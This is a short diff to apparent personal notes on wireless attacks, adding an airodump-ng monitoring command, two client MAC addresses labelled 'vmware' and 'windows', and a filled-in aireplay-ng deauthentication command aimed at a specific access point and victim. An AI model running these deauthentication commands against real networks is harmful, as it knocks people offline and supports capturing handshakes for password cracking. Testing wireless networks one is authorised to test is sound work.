@@ -6,3 +6,12 @@ sudo aireplay-ng -0 1 -a [MAC_ACCESSPOINT] -c [MAC_VICTIM] wlan0
   -a    : access point mac
   -c    : victim mac
   wlan0 : iface name
+
+sudo airodump-ng -c 6 mon0
+
+000c295e038d <-- vmware
+904ce536f4bd <-- windows
+
+sudo aireplay-ng -0 7 -a 001874D2E482 -c 904ce536f4bd mon0
+
+
